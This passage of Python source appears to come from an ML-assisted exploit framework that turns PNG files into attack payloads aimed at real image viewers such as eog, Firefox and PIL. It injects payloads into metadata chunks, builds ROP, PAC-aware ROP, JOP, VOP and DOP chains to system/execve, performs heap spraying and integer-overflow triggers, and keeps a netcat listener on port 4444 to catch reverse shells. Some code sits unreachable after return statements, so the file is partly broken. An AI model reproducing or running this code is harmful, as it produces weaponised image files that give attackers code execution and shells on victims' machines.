            writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
            
            # Only write header if file is new
            if not file_exists:
                writer.writeheader()
            
            for result in results:
                # Map result keys to CSV fields, with defaults for missing keys
                row = {
                    "timestamp": result.get("timestamp", ""),
                    "original_file": result.get("file", ""),
                    "viewer": result.get("viewer", ""),
                    "fuzz_type": result.get("fuzz_type", ""),
                    "payload_offset_attempted": result.get("payload_offset_attempted", 0),
                    "trigger_offset_attempted": result.get("trigger_offset_attempted", 0),
                    "status": result.get("status", ""),
                    "reason": result.get("reason", ""),
                    "retry_attempt": result.get("retry_attempt", 0),
                    "payload_validated": result.get("payload_validated", False),
                    "platform": result.get("platform", ""),
                    "fitting_payload_addr": result.get("fitting_payload_addr", ""),
                    "fitting_offsets": "; ".join(result.get("fitting_offsets", [])) if result.get("fitting_offsets") else "",
                    "success_label": 1 if result.get("payload_validated") else 0,
                    "confidence_score": result.get("confidence_score", 0.0)
                }
                writer.writerow(row)
        
        logger.info(f"Appended {len(results)} results to {csv_path}")
    
    except Exception as e:
        logger.error(f"Failed to save trajectory database to {csv_path}: {e}")
        import traceback
        logger.error(traceback.format_exc())

def inject_metadata_trigger(file_path: str, payload: Union[str, bytes]) -> bool:
    """
    Injects payload into PNG metadata chunks to trigger metadata parsing vulnerabilities.
    
    This targets viewers that parse metadata (e.g., eog's metadata reader) by injecting
    malicious data into tEXt, iTXt, or other metadata chunks. The payload is embedded
    in a way that may cause buffer overflows or other issues during metadata processing.
    
    Args:
        file_path: Path to the PNG file to modify.
        payload: The payload string or bytes to inject.
    
    Returns:
        True if injection succeeds, False otherwise.
    """
    try:
        orig_payload = payload
        if isinstance(orig_payload, str):
            orig_payload = orig_payload.encode()
        
        with open(file_path, 'rb') as f:
            content = bytearray(f.read())
        
        iend_index = content.find(IEND_CHUNK)
        if iend_index == -1:
            return False
        iend_start = iend_index - 4
        
        # Inject multiple metadata chunks to increase trigger chances
        metadata_chunks = [
            ("Title", orig_payload),  # tEXt chunk for title
            ("Author", b"A" * 100 + orig_payload),  # tEXt with padding
            ("Description", orig_payload + b"\x00" * 50),  # tEXt with null bytes
            ("Comment", b"Metadata trigger: " + orig_payload),  # tEXt comment
            ("INJECTED_PAYLOAD", orig_payload),  # tEXt chunk for instrumentation payload execution
        ]
        
        for key, data in metadata_chunks:
            # Create tEXt chunk: length + "tEXt" + key + "\x00" + data + CRC
            key_bytes = key.encode() + b"\x00"
            chunk_data = key_bytes + data
            chunk_length = len(chunk_data).to_bytes(4, 'big')
            chunk_type = b"tEXt"
            crc = calculate_png_crc(chunk_type, chunk_data)
            chunk = chunk_length + chunk_type + chunk_data + crc
            
            # Insert before IEND
            content[iend_start:iend_start] = chunk
            iend_index = content.find(IEND_CHUNK)
            iend_start = iend_index - 4
        
        # Also inject an iTXt chunk for international text (more complex metadata)
        itxt_key = b"XML:com.adobe.xmp"
        itxt_data = b'<?xpacket begin="" id="W5M0MpCehiHzreSzNTczkc9d"?>\n' + orig_payload + b'\n<?xpacket end="w"?>\n'
        itxt_chunk_data = itxt_key + b"\x00" + b"\x00" + b"\x00" + b"\x00" + itxt_data  # Compression flag, method, language, translated keyword
        itxt_length = len(itxt_chunk_data).to_bytes(4, 'big')
        itxt_type = b"iTXt"
        itxt_crc = calculate_png_crc(itxt_type, itxt_chunk_data)
        itxt_chunk = itxt_length + itxt_type + itxt_chunk_data + itxt_crc
        
        content[iend_start:iend_start] = itxt_chunk
        iend_index = content.find(IEND_CHUNK)
        iend_start = iend_index - 4
        
        # Update IDAT CRC if necessary
        content = find_and_update_chunk_crc(content, b'IDAT')
        
        with open(file_path, 'wb') as f:
            f.write(content)
        
        logger.info(f"Metadata trigger injection successful for {file_path}")
        return True
    
    except Exception as e:
        logger.error(f"Metadata trigger injection failed: {e}")
        import traceback
        logger.error(traceback.format_exc())
        return False
    
def compile_rop_chain_pac_aware(arch: str, gadgets: List[Dict], payload_addr: int,
                                leaks: Dict = None, chain_base_addr: Optional[int] = None,
                                pac_enabled: bool = True) -> bytes:
    """
    Compiles a PAC-aware ROP chain for AArch64.
    
    Strategy:
    1. If PAC enabled: Use LDRAA (authenticated load) + BLRAAZ (authenticated branch)
    2. Otherwise: Fall back to standard ROP
    """
    if arch != "aarch64":
        logger.warning(f"PAC-aware ROP only supported on AArch64, got {arch}")
        return b""
    
    leaks = leaks or {}
    system_addr = leaks.get("system", 0)
    payload_address = payload_addr
    
    if not system_addr:
        logger.warning("System address not leaked, cannot compile PAC-aware ROP chain")
        return b""
    
    if pac_enabled:
        # PAC-aware gadget chain
        # 1. Load authenticated system pointer
        ldraa_gadget = leaks.get("gadget_ldraa_x0_x1_br_x0", 0)
        # 2. Authenticate and branch
        blraaz_gadget = leaks.get("gadget_blraaz_x0", 0)
        
        if not (ldraa_gadget and blraaz_gadget):
            logger.warning("PAC-aware gadgets not found in leaks. Falling back to standard ROP.")
            # Fall back to standard ROP chain
            pop_x0_x1_x2 = leaks.get("pop_x0_x1_x2_ret", 0)
            if pop_x0_x1_x2:
                rop_chain = (
                    pop_x0_x1_x2.to_bytes(8, 'little') +
                    payload_address.to_bytes(8, 'little') +
                    b"\x00" * 8 +
                    system_addr.to_bytes(8, 'little')
                )
                logger.info("Generated standard (non-PAC) ROP chain as fallback")
                return rop_chain
            return b""
        
        # ROP chain with PAC-aware gadgets:
        # Pop values into x0, x1 for LDRAA
        # x1 = address of authenticated system pointer
        # x0 = [x1] via LDRAA (authenticated)
        # BLRAAZ x0 (authenticate before branch)
        
        rop_chain = b""
        
        # 1. Prepare x1 to point to authenticated system address
        pop_x0_x1_gadget = leaks.get("pop_x0_x1_x2_ret", 0)
        if pop_x0_x1_gadget:
            rop_chain += pop_x0_x1_gadget.to_bytes(8, 'little')
            rop_chain += payload_address.to_bytes(8, 'little')  # x0 = payload
            rop_chain += system_addr.to_bytes(8, 'little')      # x1 = system
            rop_chain += b"\x00" * 8                             # x2 (padding)
        
        # 2. Load and authenticate
        rop_chain += ldraa_gadget.to_bytes(8, 'little')
        
        # 3. Authenticate and branch
        rop_chain += blraaz_gadget.to_bytes(8, 'little')
        
        logger.info("Generated PAC-aware ROP chain with LDRAA + BLRAAZ")
        return rop_chain
    else:
        # Standard ROP (no PAC)
        pop_x0_x1_x2 = leaks.get("pop_x0_x1_x2_ret", 0)
        
        if system_addr and pop_x0_x1_x2:
            rop_chain = (
                pop_x0_x1_x2.to_bytes(8, 'little') +
                payload_address.to_bytes(8, 'little') +
                b"\x00" * 8 +
                system_addr.to_bytes(8, 'little')
            )
            logger.info("Generated standard (non-PAC) ROP chain")
            return rop_chain
    
    return b""

def inject_payload_with_leaks(file_path: str, payload: Union[str, bytes], trigger_offset: int = 0, 
                              fuzz_type: str = "default", leaks: Dict = None, payload_offset: int = 0, 
                              chain_base_addr: Optional[int] = None, force_chain_type: Optional[str] = None) -> bool:
    """Advanced payload injector with ROP/JOP/VOP/DOP support."""
    arch = "aarch64" if "aarch64" in platform.machine().lower() else "x86_64"
    leaks = leaks or {}
    
    # Determine chain type from leaks, but allow override
    pac_enabled = bool(leaks.get("pac_enabled", False))
    vop_available = bool(leaks.get("gadget_vop_ldr_str_q0") or leaks.get("gadget_vop_fmov"))
    
    if force_chain_type:
        chain_type = force_chain_type
        logger.info(f"Forced chain type: {chain_type}")
    else:
        # Original logic
        chain_type = "ROP"  # Default
        if vop_available and os.environ.get("FORCE_VOP"):
            chain_type = "VOP"
            logger.info("VOP gadgets detected and FORCE_VOP enabled - using VOP chain")
        elif vop_available and fuzz_type in ["metadata_trigger", "overflow"]:  # VOP good for image parsers
            chain_type = "VOP"
            logger.info(f"VOP gadgets detected and suitable for {fuzz_type} - using VOP chain")
        elif pac_enabled and fuzz_type in ["uaf", "optimization_bypass"]:
            chain_type = "PAC_ROP"
            logger.info("PAC enabled - using PAC-aware ROP chain")
        elif fuzz_type in ["double_free", "metadata_trigger"]:
            chain_type = "JOP"
            logger.info(f"Fuzz type {fuzz_type} prefers JOP - using JOP chain")
    
    debug_info = {
        "file": os.path.basename(file_path),
        "fuzz_type": fuzz_type,
        "chain_type": chain_type,  # New field tracking which chain was used
        "attack_chain": [],
        "leaked_addresses": {k: hex(v) if isinstance(v, int) else v for k, v in leaks.items()}
    }

    try:
        orig_payload = payload
        if isinstance(orig_payload, str): 
            orig_payload = orig_payload.encode()
        
        final_payload = orig_payload
        
        with open(file_path, 'rb') as f:
            content = bytearray(f.read())
        
        iend_index = content.find(IEND_CHUNK)
        if iend_index == -1: 
            return False
        iend_start = iend_index - 4

        # ==================== VOP Chain Injection ====================
        if chain_type == "VOP":
            logger.info("Injecting VOP chain for image parsing bypass...")
            vop_chain = compile_vop_chain(arch, [], leaks.get("payload", 0), leaks, chain_base_addr)
            
            if vop_chain:
                vop_key = b"VOP_Chain"
                vop_data = vop_key + b"\x00" + vop_chain
                vop_chunk = len(vop_data).to_bytes(4, 'big') + b"tEXt" + vop_data + calculate_png_crc(b"tEXt", vop_data)
                content[iend_start:iend_start] = vop_chunk
                iend_index = content.find(IEND_CHUNK)
                iend_start = iend_index - 4
                
                debug_info["attack_chain"].append("VOP_LDR_STR_Q0")
                debug_info["attack_chain"].append("VOP_FMOV_STR")
                logger.info("VOP chain injection complete")
            
            # For VOP, also inject a DOP variant as fallback
            dop_chain = compile_dop_chain(arch, [], leaks.get("payload", 0), leaks, chain_base_addr)
            if dop_chain:
                dop_key = b"DOP_Chain"
                dop_data = dop_key + b"\x00" + dop_chain
                dop_chunk = len(dop_data).to_bytes(4, 'big') + b"tEXt" + dop_data + calculate_png_crc(b"tEXt", dop_data)
                content[iend_start:iend_start] = dop_chunk
                iend_index = content.find(IEND_CHUNK)
                iend_start = iend_index - 4
                
                debug_info["attack_chain"].append("DOP_VECTOR_COPY")
                logger.info("DOP fallback chain injected")
        
        # ==================== PAC-Aware ROP Injection ====================
        elif chain_type == "PAC_ROP":
            logger.info("Injecting PAC-aware ROP chain...")
            rop_chain = compile_rop_chain_pac_aware(arch, [], leaks.get("payload", 0), leaks, chain_base_addr, pac_enabled=True)
            
            if rop_chain:
                rop_key = b"PAC_ROP"
                rop_data = rop_key + b"\x00" + rop_chain
                rop_chunk = len(rop_data).to_bytes(4, 'big') + b"tEXt" + rop_data + calculate_png_crc(b"tEXt", rop_data)
                content[iend_start:iend_start] = rop_chunk
                iend_index = content.find(IEND_CHUNK)
                iend_start = iend_index - 4
                
                debug_info["attack_chain"].append("LDRAA_LOAD")
                debug_info["attack_chain"].append("BLRAAZ_BRANCH")
                logger.info("PAC-aware ROP chain injection complete")
            
            if leaks.get("system"):
                final_payload = leaks["system"].to_bytes(8, 'little') + final_payload
        
        # ==================== Standard Fuzz Type Handling ====================
        if fuzz_type == "uaf":
            logger.info("Injecting UAF heapspray...")
            command_buffer = orig_payload.ljust(64, b"\x00")
            payload_addr = leaks.get("payload", 0)
            vtable_ptr = payload_addr.to_bytes(8, 'little') if payload_addr else (0xDEADBEEF).to_bytes(8, 'little')
            
            spray_data = command_buffer + vtable_ptr
            
            num_spray_chunks = 10
            for i in range(num_spray_chunks):
                chunk_data = b"UAF_Spray" + b"\x00" + spray_data + str(i).encode()
                length = len(chunk_data).to_bytes(4, 'big')
                content[iend_start:iend_start] = length + b"tEXt" + chunk_data + calculate_png_crc(b"tEXt", chunk_data)
                iend_index = content.find(IEND_CHUNK)
                iend_start = iend_index - 4
            
            if leaks.get("system"):
                final_payload = leaks["system"].to_bytes(8, 'little') + final_payload
        
        elif fuzz_type == "overflow":
            logger.info("Injecting overflow instrumentation chains (ROP + JOP + DOP + VOP)")

            # ROP chain
            rop_chain = compile_rop_chain(arch, [], leaks.get("payload", 0), leaks, chain_base_addr)
            if rop_chain:
                rop_key = b"ROP_Overflow"
                rop_data = rop_key + b"\x00" + rop_chain
                content[iend_start:iend_start] = len(rop_data).to_bytes(4, 'big') + b"tEXt" + rop_data + calculate_png_crc(b"tEXt", rop_data)
                iend_index = content.find(IEND_CHUNK)
                iend_start = iend_index - 4
                debug_info["attack_chain"].append("ROP_OVERFLOW")

            # JOP chain
            jop_chain = compile_jop_chain(arch, [], leaks.get("payload", 0), leaks, chain_base_addr)
            if jop_chain:
                jop_key = b"JOP_Overflow"
                jop_data = jop_key + b"\x00" + jop_chain
                content[iend_start:iend_start] = len(jop_data).to_bytes(4, 'big') + b"tEXt" + jop_data + calculate_png_crc(b"tEXt", jop_data)
                iend_index = content.find(IEND_CHUNK)
                iend_start = iend_index - 4
                debug_info["attack_chain"].append("JOP_OVERFLOW")

            # VOP chain
            vop_chain = compile_vop_chain(arch, [], leaks.get("payload", 0), leaks, chain_base_addr)
            if vop_chain:
                vop_key = b"VOP_Overflow"
                vop_data = vop_key + b"\x00" + vop_chain
                content[iend_start:iend_start] = len(vop_data).to_bytes(4, 'big') + b"tEXt" + vop_data + calculate_png_crc(b"tEXt", vop_data)
                iend_index = content.find(IEND_CHUNK)
                iend_start = iend_index - 4
                debug_info["attack_chain"].append("VOP_OVERFLOW")

            # DOP chain
            dop_chain = compile_dop_chain(arch, [], leaks.get("payload", 0), leaks, chain_base_addr)
            if dop_chain:
                dop_key = b"DOP_Overflow"
                dop_data = dop_key + b"\x00" + dop_chain
                content[iend_start:iend_start] = len(dop_data).to_bytes(4, 'big') + b"tEXt" + dop_data + calculate_png_crc(b"tEXt", dop_data)
                iend_index = content.find(IEND_CHUNK)
                iend_start = iend_index - 4
                debug_info["attack_chain"].append("DOP_OVERFLOW")

            # Add integer overflow trigger chunk
            w = 0x40000001
            h = 4
            ovf_data = w.to_bytes(4, 'little') + h.to_bytes(4, 'little')
            chunk_type = b"ovfW"
            content[iend_start:iend_start] = len(ovf_data).to_bytes(4, 'big') + chunk_type + ovf_data + calculate_png_crc(chunk_type, ovf_data)
            iend_index = content.find(IEND_CHUNK)
            iend_start = iend_index - 4

            # If system present, prioritize it; else use execve fallback if available
            if leaks.get("system") or leaks.get("execve"):
                function_addr = leaks.get("system") or leaks.get("execve")
                final_payload = function_addr.to_bytes(8, 'little') + final_payload
        
        # ... [rest of fuzz types: double_free, metadata_trigger, generic_viewer, aggressive_viewer] ...
        # (Keep existing code for these)
        
        # Additional instrumentation for double_free/metadata_trigger/uaf/optimization_bypass
        if fuzz_type in ["double_free", "metadata_trigger", "uaf", "optimization_bypass"]:
            for chain_name, chain_func in [
                ("ROP", compile_rop_chain),
                ("JOP", compile_jop_chain),
                ("VOP", compile_vop_chain),
                ("DOP", compile_dop_chain),
            ]:
                chain_payload = chain_func(arch, [], leaks.get("payload", 0), leaks, chain_base_addr)
                if chain_payload:
                    chain_key = f"{chain_name}_{fuzz_type}".encode()
                    chain_data = chain_key + b"\x00" + chain_payload
                    chunk_bytes = len(chain_data).to_bytes(4, 'big') + b"tEXt" + chain_data + calculate_png_crc(b"tEXt", chain_data)
                    content[iend_start:iend_start] = chunk_bytes
                    iend_index = content.find(IEND_CHUNK)
                    iend_start = iend_index - 4
                    debug_info["attack_chain"].append(f"{chain_name}_{fuzz_type.upper()}")
                    logger.info(f"Injected fallback {chain_name} chain for {fuzz_type} (system/execve) in addition")

        # ==================== Final Payload Wrapping ====================
        if b"FITNESS_OK" not in final_payload: 
            final_payload += b"\x00FITNESS_OK\n"
        
        # Wrap in tEXt chunk with offset
        p_key = b"InfectionPayload"
        if payload_offset > 0:
            p_data = p_key + b"\x00" + b"A" * payload_offset + final_payload
        else:
            p_data = p_key + b"\x00" + final_payload
        
        p_chunk = len(p_data).to_bytes(4, 'big') + b"tEXt" + p_data + calculate_png_crc(b"tEXt", p_data)
        
        iend_index = content.find(IEND_CHUNK)
        iend_start = iend_index - 4
        new_content = content[:iend_start] + p_chunk + content[iend_start:]
        new_content = find_and_update_chunk_crc(new_content, b'IDAT')

        with open(file_path, 'wb') as f:
            f.write(new_content)
        
        with open(f"{file_path}.debug", 'w') as f:
            json.dump(debug_info, f, indent=2)
        
        logger.info(f"Payload injection successful: {chain_type} chain used")
        return True
    
    except Exception as e:
        logger.error(f"Injection failed: {e}")
        import traceback
        logger.error(traceback.format_exc())
        return False


class UnifiedFuzzer:
    def __init__(self, platform_id: str, use_advisor: bool = False, use_intelligent: bool = False, use_legacy: bool = False):
        self.platform_id = platform_id
        self.use_advisor = use_advisor
        self.use_intelligent = use_intelligent
        self.use_legacy = use_legacy
        # Define the path to the virtual environment python executable
        venv_python = os.path.expanduser("~/nvenv/bin/python")
        self.device = torch.device("cuda" if torch.cuda.is_available() else "mps" if torch.backends.mps.is_available() else  "cpu")
        self.gadget_names = ["pop_x0_x1_ret", "ldr_x0_x1_br_x0", "vop_ldr_str_q0", "pacia_x30", "autia_x30", "ldraa_x0_x1", "blraa_x0", "vop_ldr_d0_x1", "vop_str_d0_x0"]
        self.address_samples = []
        self.oracle = AddressOracle(58, 9)  # input_dim: 6(process) + 50(elf) + 2(viewer), output_dim: 9 gadgets
        self.use_oracle = False
        self.oracle_accuracy = 0.0
        # Try to load saved Oracle
        try:
            self.oracle.load_state_dict(torch.load("models/address_oracle.pth", map_location=self.device))
            self.use_oracle = True
            self.oracle_accuracy = 1.0  # Assume good if saved
            logger.info("Loaded AddressOracle model.")
        except Exception as e:
            logger.info(f"No AddressOracle model found or failed to load: {e}")
        self.viewers = [
            {"name": "png_consumer", "cmd": ["./png_consumer"]},
            {"name": "eog", "cmd": ["/usr/bin/eog"]},
            {"name": "firefox", "cmd": ["/snap/bin/firefox", "--headless"]},
            {"name": "PIL", "cmd": [venv_python, "pil_loader.py"]} # Ensure absolute path for venv python
        ]
        self.leaks = leak_addresses()
        self.weaknesses = ["optimization_bypass", "uaf", "overflow", "metadata_trigger", "generic_viewer", "aggressive_viewer", "double_free"]
        self.fuzz_types_for_ml = sorted(list(set(self.weaknesses))) # Unique sorted list of fuzz types
        self.chain_types_for_ml = ["ROP", "JOP", "DOP", "VOP"] # Initialize chain types for ML
        self.max_payload_offset = 16384 # Max expected payload offset for normalization
        self.max_trigger_offset = 16384 # Max expected trigger offset for normalization

        # Netcat monitoring and persistence for reverse shell payloads
        self.netcat_process = None
        self.netcat_output_file = ""
        self.netcat_log_dir = os.path.join("logs", "files", "netcat")
        self.netcat_port = 4444
        self.ensure_netcat_listener()
        
        self.ml_model: Optional[VAEGAN] = None
        self.data_processor = None # data_processor module
        self.crash_monitor_last_read_pos = 0 # For /var/log/apport.log

    def predict_gadget_addresses(self, pid, elf_features, viewer_name):
        if not self.use_oracle or self.oracle is None:
            return {}
        try:
            features = collect_address_features(pid, elf_features, viewer_name, self.viewers)
            predicted_addrs = predict_addresses(self.oracle, features, device=self.device)
            return dict(zip(self.gadget_names, predicted_addrs))
        except Exception as e:
            logger.warning(f"Failed to predict addresses: {e}")
            return {}

        # Allow prioritization via environment variable PRIORITIZE_CHAIN (e.g., 'VOP')
        prioritize_chain = os.environ.get('PRIORITIZE_CHAIN', '').strip()
        if prioritize_chain:
            logger.info(f"PRIORITIZE_CHAIN set to '{prioritize_chain}'. Adjusting fuzz order and chain types.")
            # If user wants VOP prioritized, ensure 'vop' is attempted first in weaknesses and chain types include it
            if prioritize_chain.lower() == 'vop':
                if 'vop' not in self.weaknesses:
                    self.weaknesses.insert(0, 'vop')
                if 'VOP' not in self.chain_types_for_ml:
                    # Place VOP at front for priority in predictions generation
                    self.chain_types_for_ml.insert(0, 'VOP')

    def ensure_netcat_listener(self):
        """Keep a persistent netcat listener running and ensure log file path exists."""
        if self.netcat_process and self.netcat_process.poll() is None:
            return self.netcat_process, self.netcat_output_file

        os.makedirs(self.netcat_log_dir, exist_ok=True)
        self.netcat_process, self.netcat_output_file = start_netcat_listener(port=self.netcat_port, log_dir=self.netcat_log_dir)
        return self.netcat_process, self.netcat_output_file

    def _scan_viewer_crash_logs(self, viewer_output_dir: str) -> bool:
        """Check viewer output directory for crash indications in .log/.debug/.crash files."""
        if not os.path.isdir(viewer_output_dir):
            return False

        crash_found = False
        for filename in os.listdir(viewer_output_dir):
            if not filename.lower().endswith(('.log', '.debug', '.crash', '.txt')):
                continue
            path = os.path.join(viewer_output_dir, filename)
            try:
                with open(path, 'r', errors='ignore') as f:
                    text = f.read()
                if re.search(r"\b(crash|segfault|abort|panic|exception|fault|invalid|failed)\b", text, re.IGNORECASE):
                    crash_found = True
                    break
                if filename.lower().endswith(('.debug', '.crash')):
                    crash_found = True
                    break
            except Exception:
                continue

        return crash_found

    def _load_previous_trajectory_rows(self, target_base_dir: str) -> List[Dict]:
        csv_path = os.path.join(target_base_dir, 'fuzzing_trajectory.csv')
        if not os.path.exists(csv_path):
            return []

        rows = []
        try:
            with open(csv_path, newline='') as f:
                reader = csv.DictReader(f)
                for row in reader:
                    rows.append(row)
        except Exception as e:
            logger.warning(f"Unable to read previous trajectory CSV {csv_path}: {e}")
        return rows

    def _write_trajectory_rows(self, target_base_dir: str, rows: List[Dict]):
        csv_path = os.path.join(target_base_dir, 'fuzzing_trajectory.csv')
        if not rows:
            return

        fieldnames = rows[0].keys()
        try:
            with open(csv_path, 'w', newline='') as f:
                writer = csv.DictWriter(f, fieldnames=fieldnames)
                writer.writeheader()
                for row in rows:
                    writer.writerow(row)
            logger.info(f"Updated previous trajectory carousel at {csv_path} ({len(rows)} rows)")
        except Exception as e:
            logger.error(f"Failed to rewrite trajectory CSV {csv_path}: {e}")

    def _count_previous_successes(self, rows: List[Dict]) -> Dict[str, Dict[str, Dict[str, int]]]:
        counts = {}
        for row in rows:
            status = str(row.get('status', '')).strip().upper()
            payload_validated = str(row.get('payload_validated', '')).strip().lower()
            if payload_validated in ('1', 'true', 'yes') or status in ('SUCCESS', 'TRIGGERED', 'PAYLOAD_EXECUTED', 'CRASHED_INFERRED'):
                viewer = row.get('viewer', 'unknown')
                method = 'unknown'
                reason = str(row.get('reason', '')).lower()
                if 'netcat' in reason or 'rshell' in reason or 'reverse shell' in reason:
                    method = 'rshell'
                elif 'syslog' in reason or 'journalctl' in reason:
                    method = 'syslog'
                elif 'vop' in reason or 'rop' in reason or 'jop' in reason or 'dop' in reason:
                    method = reason if reason in ('rop', 'jop', 'vop', 'dop') else 'chain'
                else:
                    method = 'other'

                fuzz_type = row.get('fuzz_type', 'unknown').upper() or 'UNKNOWN'
                counts.setdefault(viewer, {}).setdefault(method, {}).setdefault(fuzz_type, 0)
                counts[viewer][method][fuzz_type] += 1
        return counts

    def _parse_latest_netcat_entries(self, check_last_n: int = 3) -> Dict[str, int]:
        if not os.path.isdir(self.netcat_log_dir):
            return {}

        log_files = sorted(
            [os.path.join(self.netcat_log_dir, p) for p in os.listdir(self.netcat_log_dir) if p.startswith('netcat_') and p.endswith('.log')],
            key=lambda p: os.path.getmtime(p)
        )

        if not log_files:
            return {}

        interesting_files = log_files[-check_last_n:]
        unique_ids = set()
        for path in interesting_files:
            try:
                with open(path, 'r', errors='ignore') as f:
                    text = f.read()
                for m in re.finditer(r"([A-Za-z0-9_\-]{8,})", text):
                    token = m.group(1)
                    if token and len(token) >= 8:
                        unique_ids.add(token)
            except Exception:
                continue

        return {'unique_payloads': len(unique_ids), 'files_scanned': len(interesting_files)}

    def _reconcile_previous_run_state(self, target_base_dir: str):
        rows = self._load_previous_trajectory_rows(target_base_dir)
        if not rows:
            logger.info('No previous trajectory file found, starting fresh.')
            return

        per_viewer_crash = {}
        for viewer in self.viewers:
            viewer_dir = os.path.join(target_base_dir, viewer['name'])
            per_viewer_crash[viewer['name']] = self._scan_viewer_crash_logs(viewer_dir)

        self.inferred_crashed_trajectories = set()
        any_updates = False
        for row in rows:
            status = str(row.get('status', '')).strip().upper()
            viewer_name = row.get('viewer', '')
            key = (row.get('original_file', ''), viewer_name, row.get('fuzz_type', ''))
            if status in ('NOT_TRIGGERED', 'UNKNOWN', 'UNTRIGGERED', '') and per_viewer_crash.get(viewer_name, False):
                row['status'] = 'CRASHED_INFERRED'
                row['reason'] = 'Inferred from crash logs in previous run; should retry instrumentation.'
                self.inferred_crashed_trajectories.add(key)
                any_updates = True

        if any_updates:
            self._write_trajectory_rows(target_base_dir, rows)

        success_counts = self._count_previous_successes(rows)
        netcat_stats = self._parse_latest_netcat_entries()

        logger.info('Previous run trajectory summary (pre-run):')
        logger.info(json.dumps(success_counts, indent=2))
        logger.info(f"Netcat recent payload signatures: {netcat_stats}")

        return {
            'rows': rows,
            'success_counts': success_counts,
            'netcat_stats': netcat_stats,
            'recon_updates': any_updates
        }

    def _find_all_trajectory_directories(self) -> List[str]:
        """Scan for all previous trajectory directories (fuzz_results_single, infected_media_unified_*)."""
        dirs = []
        cwd = os.getcwd()
        
        # Check for fuzz_results_single (standard --single output)
        if os.path.isdir(os.path.join(cwd, 'fuzz_results_single')):
            dirs.append('fuzz_results_single')
        
        # Check for infected_media_unified_* directories (platform runs)
        for entry in os.listdir(cwd):
            if entry.startswith('infected_media_unified_') and os.path.isdir(os.path.join(cwd, entry)):
                dirs.append(entry)
        
        return dirs

    def _reconcile_all_previous_runs(self):
        """Reconcile all previous trajectory contexts (--single and --platform runs)."""
        all_dirs = self._find_all_trajectory_directories()
        if not all_dirs:
            logger.info('No previous trajectory directories found, starting fresh.')
            return {}

        logger.info('Found previous trajectory directories: %s', all_dirs)
        
        self.inferred_crashed_trajectories = set()
        all_success_counts = {}
        all_netcat_stats = {}
        all_recon_updates = 0

        for traj_dir in all_dirs:
            logger.info('Reconciling trajectory from: %s', traj_dir)
            result = self._reconcile_previous_run_state(traj_dir)
            
            if result:
                # Merge success counts per viewer/method
                for viewer, methods in result.get('success_counts', {}).items():
                    if viewer not in all_success_counts:
                        all_success_counts[viewer] = {}
                    for method, fuzz_types in methods.items():
                        if method not in all_success_counts[viewer]:
                            all_success_counts[viewer][method] = {}
                        for fuzz_type, count in fuzz_types.items():
                            all_success_counts[viewer][method][fuzz_type] = all_success_counts[viewer][method].get(fuzz_type, 0) + count
                
                # Track netcat stats from each context
                all_netcat_stats[traj_dir] = result.get('netcat_stats', {})
                
                if result.get('recon_updates'):
                    all_recon_updates += 1

        logger.info('=== RECONCILIATION SUMMARY ACROSS ALL TRAJECTORIES ===')
        logger.info('Total directories reconciled: %d', len(all_dirs))
        logger.info('Directories with updates: %d', all_recon_updates)
        logger.info('Aggregated success metrics: %s', json.dumps(all_success_counts, indent=2))
        logger.info('Netcat stats by directory: %s', json.dumps(all_netcat_stats, indent=2))
        
        return {
            'all_dirs': all_dirs,
            'aggregated_success_counts': all_success_counts,
            'aggregated_netcat_stats': all_netcat_stats,
            'inferred_trajectories_to_retry': len(self.inferred_crashed_trajectories),
            'total_reconciled_updates': all_recon_updates
        }
        self.lime_explainer_payload_offset: Optional[LimeExplainer] = None

        if self.use_intelligent or self.use_advisor:
            logger.info("Intelligent/Advisor mode enabled. Initializing ML components.")
            os.makedirs("runs/fuzzing", exist_ok=True)
            os.makedirs("models", exist_ok=True)
            
            dummy_sample = FuzzingSample(
                viewer_name="dummy", fuzz_type="dummy", file_features=[0.0] * 10, # Updated to match _extract_file_features output
                payload_offset_attempted=0, status_one_hot=[0.0, 0.0, 0.0, 0.0, 0.0],
                gdb_crash_features=[0.0] * 5, leaked_addresses_features=[0.0] * 3,
                apport_crash_features=[0.0] * 5, success_label=0,
                trigger_offset_attempted=0, # New field
                elf_features=[0.0] * ELF_FEATURE_VECTOR_SIZE # New field
            )
            calculated_input_dim = (
                len(dummy_sample.file_features) +
                len(dummy_sample.status_one_hot) +
                len(dummy_sample.gdb_crash_features) +
                len(dummy_sample.leaked_addresses_features) +
                len(dummy_sample.apport_crash_features) +
                len(dummy_sample.elf_features) + # New: for elf_features
                1 + # for normalized_payload_offset
                1   # for normalized_trigger_offset
            )
            
            # Calculate output_dim based on fuzz_types and chain_types
            calculated_output_dim = len(self.fuzz_types_for_ml) + len(self.chain_types_for_ml) + 2
            self.ml_model = VAEGAN(input_dim=calculated_input_dim, latent_dim=20, output_dim=calculated_output_dim)
            self.device = "cuda" if torch.cuda.is_available() else "cpu"
            self.ml_model.to(self.device)
            
            model_path = "models/vaegan_fuzzer_model.pth"
            if os.path.exists(model_path):
                try:
                    # Load state dict, but allow for size mismatches if output_dim changed
                    # This will load matching parameters and leave new ones uninitialized
                    self.ml_model.load_state_dict(torch.load(model_path, map_location=self.device), strict=False)
                    logger.info(f"Loaded pre-trained VAEGAN model from {model_path} (strict=False to allow size mismatches).")
                except Exception as e:
                    logger.error(f"Failed to load VAEGAN model: {e}. Reinitializing model.")
                    self.ml_model = VAEGAN(input_dim=calculated_input_dim, latent_dim=20, output_dim=calculated_output_dim) # Reinitialize
                    self.ml_model.to(self.device)
            else:
                logger.warning("No pre-trained VAEGAN model found. Model will be trained if data is available.")

    def train_ml_model(self, data_dirs: List[str], epochs: int = 10, generate_lime_explanations: bool = False): # Added epochs and generate_lime_explanations parameter
        """Orchestrates the training of the VAE/GAN model."""
        if not (self.use_intelligent or self.use_advisor):
            logger.warning("ML model training skipped: Intelligent/Advisor mode not enabled.")
            return

        logger.info(f"Loading and processing historical data from {data_dirs}...")
        samples = load_and_process_data(data_dirs)

        if not samples:
            logger.warning("No historical fuzzing samples found for ML training.")
            return

        # Define chain types for the dataset
        # Use self.chain_types_for_ml which is initialized in __init__
        dataset = FuzzingDataset(samples, self.fuzz_types_for_ml, self.chain_types_for_ml, self.max_payload_offset, self.max_trigger_offset)
        
        # If model was not loaded or reinitialized due to mismatch, create a new one with correct dimensions
        if not self.ml_model or \
           (self.ml_model.encoder.fc1.in_features != dataset.input_dim or self.ml_model.decoder.fc3.out_features != dataset.output_dim):
            logger.info(f"Initializing/Updating VAEGAN model dimensions: input_dim={dataset.input_dim}, output_dim={dataset.output_dim}")
            self.ml_model = VAEGAN(input_dim=dataset.input_dim, latent_dim=20, output_dim=dataset.output_dim)
            self.ml_model.to(self.device)
